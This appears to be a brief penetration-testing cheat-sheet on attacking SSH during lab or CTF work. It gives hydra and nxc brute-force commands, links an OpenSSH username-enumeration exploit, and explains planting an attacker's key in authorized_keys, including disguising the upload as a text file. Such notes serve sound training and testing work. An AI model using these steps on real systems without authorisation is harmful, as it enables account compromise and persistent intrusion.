# SSH

just keep this in mind. Once you have creds or id_rsa keys, try logging in

- openssh7.2p2 is vulnerable to username enumeration https://www.exploit-db.com/exploits/40113

- you can use nxc or hydra to brute force! Not recommended unless you have a specific username or password already.

```bash
nxc ssh <target ip> -u users.txt -p password.txt

hydra -L users.txt -P password.txt ssh://<target ip>
```

If you can somehow write or upload files into the /home/username/.ssh directory, you can create your own ssh keys and then enter via your own keys!

```bash
# on kali, save the file as id_rsa.pub and upload the public key as /home/target user/.ssh/authorized_keys

ssh-keygen

# if there are issues uploading it, you can try to disguise the file as a txt file or sth

```
if you run into a restricted shell, check out this resource 
[https://exploit-notes.hdks.org/exploit/network/protocol/restricted-shell-bypass/](https://exploit-notes.hdks.org/exploit/network/protocol/restricted-shell-bypass/)

[https://vk9-sec.com/linux-restricted-shell-bypass/](https://vk9-sec.com/linux-restricted-shell-bypass/) (SSH is interesting)
https://0xffsec.com/handbook/shells/restricted-shells/